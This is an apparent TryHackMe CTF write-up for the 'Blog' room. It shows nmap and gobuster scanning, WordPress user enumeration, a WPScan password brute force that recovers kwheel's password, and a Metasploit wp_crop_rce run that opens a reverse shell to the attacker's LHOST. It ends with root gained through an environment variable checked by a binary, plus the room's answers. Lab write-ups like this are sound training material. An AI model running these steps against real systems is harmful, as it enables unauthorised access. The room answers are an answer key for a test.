# Blog | TryHackMe

## Overview
- **Room:** Blog  
- **Difficulty:** Medium  
- **Tags:** WordPress, Gobuster, Wpscan, PrivEsc  

---

## Enumeration

### Nmap
```bash
nmap -sC -sV -oN <IP>
```

**Open Ports:**
- 22/tcp - SSH  
- 80/tcp - HTTP  

---

### Web Enumeration (Port 80)
Visited `http://<IP>/` → WordPress blog.  

Checked `robots.txt` → nothing useful.  

Ran gobuster:  
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Found `/admin`.  

Identified WordPress 5.0 from page source.  

---

### User Enumeration
Checked WordPress API endpoint:  
```http://<IP>/wp-json/wp/v2/users```  
Found users: `kwheel`, `bjoel`  

---

### WPScan
```bash
wpscan --url http://<IP>/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
```
Credentials found:  
- `kwheel : cutiepie1`  

---

## Exploitation

Logged in as `kwheel`.  

Tried uploading reverse shell → failed.  

Switched to Metasploit:  
```bash
msfconsole
search wordpress 5.0
use exploit/multi/http/wp_crop_rce
set RHOSTS <IP>
set TARGETURI /
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <your_IP>
run
```
Got shell as `www-data`.  

---

## Privilege Escalation

Ran `linpeas.sh`.  
Discovered password for user `bjoel`.  

Also found suspicious binary `checker`.  
Analyzed with Ghidra → program checks `admin` environment variable.  

```bash
export admin=1
/usr/bin/checker
whoami
root
```

---

## Flags
- **User.txt** → `/media/usb/user.txt`  
- **Root.txt** → `/root/root.txt`  

---

## Answers to Room Questions
1. **What is the WordPress version?** → `5.0`  
2. **Which users were found via API?** → `kwheel`, `bjoel`  
3. **What password was cracked for kwheel?** → `cutiepie1`  
4. **Which binary was exploited for root?** → `checker`  
5. **Where was the user flag located?** → `/media/usb/user.txt`  

---

## Lessons Learned
- WordPress REST API leaks usernames.  
- WPScan automates brute-forcing WordPress users.  
- Analyzing binaries with Ghidra helps discover logic flaws.  
- Environment variable abuse can lead to privilege escalation.  
